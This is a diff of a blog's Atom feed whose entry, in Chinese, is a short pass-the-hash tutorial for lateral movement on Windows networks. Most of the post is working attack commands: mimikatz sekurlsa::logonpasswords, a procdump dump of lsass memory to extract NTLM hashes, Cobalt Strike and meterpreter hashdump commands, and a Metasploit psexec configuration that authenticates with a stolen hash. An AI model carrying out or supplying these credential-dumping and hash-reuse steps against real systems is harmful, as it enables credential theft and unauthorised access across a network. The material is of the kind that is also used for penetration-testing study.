@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://onekingcc.github.io/"/>
-  <updated>2021-07-01T04:41:53.466Z</updated>
+  <updated>2021-07-01T04:53:00.771Z</updated>
   <id>http://onekingcc.github.io/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="http://onekingcc.github.io/2021/07/01/PTH/"/>
     <id>http://onekingcc.github.io/2021/07/01/PTH/</id>
     <published>2021-06-30T16:00:00.000Z</published>
-    <updated>2021-07-01T04:41:53.466Z</updated>
+    <updated>2021-07-01T04:53:00.771Z</updated>
     
     <content type="html"><![CDATA[<h5 id="hash获取"><a href="#hash获取" class="headerlink" title="hash获取"></a>hash获取</h5><p>PASS THE HASH，当我们拿下一台机器后，如果历史有登录过，就可以找到用户的ntlm hash，抓取hash之后，就可以利用这个hash的凭据去撞其他的机器，前提hash采用rc4加密的。</p><p>1.上传mimikatz </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>2.上传procdump.exe 获取lass.dmp 文件，然后mimikatz dump哈希</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp </span><br><span class="line">&quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/js/image-20210701122554034.png" alt="image-20210701122554034"></p><p><img src="/images/js/image-20210701122922449.png" alt="image-20210701122922449"></p><p>3.cs 获取hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt;hashdump</span><br></pre></td></tr></table></figure><p>4.meterpreter mimikatz自带的hash获取模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;hashdump</span><br><span class="line">meterpreter&gt;run windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure><h5 id="hash-传递攻击-PTH"><a href="#hash-传递攻击-PTH" class="headerlink" title="hash 传递攻击 PTH"></a>hash 传递攻击 PTH</h5><p>1.msf中利用psexec模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; use exploit/windows/smb/psexec</span><br><span class="line">set lhost xxxx</span><br><span class="line">set lport xxx</span><br><span class="line">set rhost xxx</span><br><span class="line">set SMBUser Administrator</span><br><span class="line">set SMBPass xxxxx   # ntlm hash</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>2.cs</p><p>利用psexec模块，选择一个本地hash即可</p>]]></content>
     
@@ -36,6 +36,8 @@
     
       <category term="横向移动" scheme="http://onekingcc.github.io/categories/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
     
+    
+      <category term="横向移动" scheme="http://onekingcc.github.io/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
     
   </entry>
   
